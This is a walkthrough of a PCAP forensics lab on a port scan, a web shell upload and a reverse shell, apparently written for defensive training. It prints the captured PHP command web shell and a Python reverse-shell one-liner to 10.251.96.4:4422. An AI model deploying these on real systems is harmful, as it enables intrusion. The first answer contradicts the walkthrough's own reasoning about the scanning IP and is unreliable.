# Network Analysis - Web Shell 

The SOC received an alert in their SIEM for ‘Local to Local Port Scanning’ where an internal private IP began scanning another internal system. Can you investigate and determine if this activity is malicious or not? You have been provided a PCAP, investigate using any tools you wish. 

# Questions

## What is the IP responsible for conducting the port scan activity? 

We can see the scan at the packet 117 when **10.251.96.4** tries to connect to **10.251.96.5:135** with a **\[SYN]** flaged packet <br>

**10.251.96.5** responds with the **[RST, ACK]** flags indicating that the port is closed. This is done extensively for a huge number of ports <br>

**Answer:** 10.251.96.5

## What is the port range scanned by the suspicious host?

If we go to **Statistics->IPV4 Statistics->Destinations and Ports** we can see all the communication between the capture machine and the addresses <br>

So, if we only visualize the target of the scan, we can see the range of ports

**Answer:** 1-1024

## What is the type of port scan conducted?

It seems to be a TCP connect scan but it does not accept the answer for any of the known types of scan (lul) <br>

Well turns out it accepts only TCP SYN although the technical nomenclature is Stealth scan

**Answer:** TCP SYN

## Two more tools were used to perform reconnaissance against open ports, what were they?
To solve this i used another resource to agilize the capture analysis ([A-Packets](https://apackets.com/upload)) <br>

In it, there was a section refering to the used **user-agents**
```
Apache Apache/2.4.29 (Ubuntu) (internal dummy connection)
Chrome Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.146 Safari/537.36
Firefox Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
gobuster/3.0.1
sqlmap/1.4.7#stable (http://sqlmap.org)
```
**Answer:** gobuster 3.0.1, sqlmap 1.4.7

## What is the name of the php file through which the attacker uploaded a web shell? 

If we follow the HTTP stream, we can see (at the end) an http form
```html
<form action="upload.php" method="post" enctype="multipart/form-data">
  Change Profile Pic
  <input type="file" name="fileToUpload" id="fileToUpload">
  <input type="submit" value="Upload Image" name="submit">
</form>
```

And we can see it is a **200** response to the following request
```
GET /editprofile.php HTTP/1.1
Host: 172.20.10.2
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.146 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://172.20.10.2/complaint.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=jbpg5n6jkaidu9955fct9p0v6l
```

**Answer:** editprofile.php

## What is the name of the web shell that the attacker uploaded? 

we can see that with the last couple of packets (following their http stream) with the following wireshark filter
``` 
FILTER: http and ip.src == 10.251.96.4 and ip.dst == 10.251.96.5

REQUEST:
POST /upload.php HTTP/1.1
Host: 10.251.96.5
(...)
-----------------------------172729275513321405741501890958
Content-Disposition: form-data; name="fileToUpload"; filename="dbfunctions.php"
Content-Type: application/x-php

<?php
if(isset($_REQUEST['cmd']) ){
echo "<pre>";
$cmd = ($_REQUEST['cmd']);
system($cmd);
echo "</pre>";
die;
}
?>

-----------------------------172729275513321405741501890958
Content-Disposition: form-data; name="submit"

Upload Image
-----------------------------172729275513321405741501890958--
```
**Answer:** dbfunctions.php

## What is the parameter used in the web shell for executing commands? 

Well, we have access to the file content
```php
<?php
    if(isset($_REQUEST['cmd']) ){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
    }
?>
```
**Answer:** cmd

## What is the first command executed by the attacker?

With the same filter, we can see the requests made to the **dbfunctions.php** through the **cmd** parameter <br>

**Answer:** id

## What is the type of shell connection the attacker obtains through command execution? 

We can see the request with the command, and we can say that it is a reverse shell 
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.251.96.4",4422));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
**Answer:** reverse

## What is the port he uses for the shell connection?

We can see from the previous answer, that the reverse shell connects to
```
"10.251.96.4",4422
```
**Answer:** 4422